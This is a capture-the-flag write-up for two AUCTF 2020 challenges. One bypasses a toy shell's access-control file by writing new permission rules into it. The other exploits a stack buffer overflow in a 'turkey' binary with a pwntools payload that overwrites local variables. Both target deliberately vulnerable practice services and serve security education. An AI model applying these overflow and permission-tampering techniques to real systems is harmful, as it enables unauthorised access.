# AUCTF-2020

Fri, 03 April 2020, 21:00 CST — Mon, 06 April 2020, 12:00 CST

**On-line**

An [AUCTF](https://ctftime.org/ctf/425) event.

Format: Jeopardy ![Jeopardy](https://ctftime.org/static/images/ct/1.png)

Official URL: https://ctf.auburn.edu/

**This event's weight is subject of [public voting](https://ctftime.org/event/1020/weight/)!**

Rating weight: 0 

**Event organizers** 

- [AUEHC](https://ctftime.org/team/82180)

------

## Easy as Pie!

### Description

> My friend just spent hours making this custom shell! He's still working on it so it doesn't have much. But we can do some stuff! He even built a custom access control list for controlling if you can access files.
>
> Check it out!
>
> `nc challenges.auctf.com 30010`
>
> Author: kensocolo

### Analysis

access to the python shell and type `help`:

```shell
% nc challenges.auctf.com 30010
Welcome to my custom shell written in Python! To get started type `help`
user@pyshell$ help

Use help <command> for help on specific command.
================================================
cat  help  ls  write

```

try `ls` command:

```shell
user@pyshell$ ls
acl.txt
user.txt
flag.txt
```

here are 3 files, try to `cat` them:

```shell
user@pyshell$ cat flag.txt
Don't have da permzzz
user@pyshell$ cat user.txt
this is some user content. I bet u wish the flag was here
user@pyshell$ cat acl.txt
user.txt:user:600
.acl.txt:root:600
.flag.txt:user:600
flag.txt:root:600
acl.txt:root:606
user@pyshell$ cat .flag.txt
nope not here sorry :)
user@pyshell$ cat .acl.txt
Don't have da permzzz
```

>  we can find two hidden files after `cat acl.txt`

the owner of both `flag.txt` and `.acl.txt` are `root` and the privileges are `600`, so only user `root` can read them.

type `help write`, we can find that the `write` command can add lines to the beginning of files

```shell
user@pyshell$ help write   

        write <content> <filename>
        adds content to the beginning of the file.
       
```

### Solution

?> maybe `acl.txt` means _**a**ccess **c**ontro**l**_?

so, try to add access control rules to `acl.txt`

```shell
user@pyshell$ write flag.txt:user:666 acl.txt
flag.txt:user:666
user@pyshell$ write .acl.txt:user:666 acl.txt
.acl.txt:user:666
```

`cat` is work after rules added:

```shell
user@pyshell$ cat flag.txt
aUctf_{h3y_th3_fl4g}
user@pyshell$ cat .acl.txt
auctf{h4_y0u_g0t_tr0ll3d_welC0m#_t0_pWN_l@nd}
```



## Thanksgiving Dinner

### Description
> I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
>
> `nc challenges.auctf.com 30011` 
>
> Note: ASLR is disabled for this challenge 
>
> Author: nadrojisk

### Attachment
[turkey](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/turkey/turkey)

### Analysis

```c
void vulnerable(void){
  char local_30 [16];
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  
  puts("Hey I heard you are searching for flags! Well I\'ve got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that\'s all I got!\n");
  local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
  fgets(local_30,0x24,stdin);
  if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }
  return;
}
```

here is a buffer overflow obviously: 

```
fgets(local_30,0x24,stdin)
```

!> `local_30` is only 16 bytes

so, our input will **overwrite** to `local_20` ... `local_10` after 16 bytes of any char.

### Solution

```python
offset = 16
payload = cyclic(offset)
payload += p32(0x2a)       # local_20 == 0x2a
payload += p32(0xdeadbeef) # local_1c != 0x14
payload += p32(0x667463)   # local_18 == 0x667463
payload += p32(0xdeadbeef) # local_14 < -0x14
payload += p32(0x1337)     # local_10 == 0x1337
```

